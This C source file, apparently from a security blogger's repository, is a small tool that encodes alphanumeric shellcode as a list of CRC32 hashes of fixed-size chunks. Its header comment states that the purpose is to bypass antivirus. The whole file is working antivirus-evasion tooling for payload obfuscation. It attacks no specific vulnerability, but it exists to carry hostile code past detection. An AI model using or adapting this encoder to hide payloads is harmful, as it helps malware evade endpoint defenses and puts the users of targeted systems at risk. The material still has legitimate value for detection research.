/*
	Author: DiabloHorn http://diablohorn.wordpress.com
	Hash encapsulation to bypass AV
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


//http://stackoverflow.com/questions/5162784/uint32-t-identifier-not-found-error
typedef __int32 int32_t;
typedef unsigned __int32 uint32_t;
typedef unsigned __int8 uint8_t;

uint32_t crc_table[256];

void genhashes(char *s,int len,int steps);
void make_crc_table(void);
uint32_t crc32(uint8_t *buf, size_t len);

void main(int argc,char *argv[]){
	if(argc < 3){
		printf("%s <numcharstohash> <alpha-numeric-shellcode>",argv[0]);
		exit(0);
	}
	make_crc_table();
	genhashes(argv[2],strlen(argv[2]),atoi(argv[1]));
}


void genhashes(char *s,int len,int steps){
	int i,j;
	char *data = (char *)malloc(steps+1);
	memset(data,0,steps+1);

	printf("\n");
	//loop through the payload every Nth character
	for(i=0;i<len;i+=steps){
		for(j=0;j<steps;j++){
			data[j] = s[i+j]; 
		}
		printf("%u,",crc32(&data[0],strlen(data)));
	}
	free(data);
}

/* Thanks wikipedia for the source */
/* Run this function previously */
void make_crc_table(void) {
	uint32_t i;
	int j;
    for (i = 0; i < 256; i++) {
        uint32_t c = i;
        for (j = 0; j < 8; j++) {
            c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
        }
        crc_table[i] = c;
    }
}

/* Thanks wikipedia for the source */
uint32_t crc32(uint8_t *buf, size_t len) {
    uint32_t c = 0xFFFFFFFF;
	size_t i;
    for (i = 0; i < len; i++) {
        c = crc_table[(c ^ buf[i]) & 0xFF] ^ (c >> 8);
    }
    return c ^ 0xFFFFFFFF;
}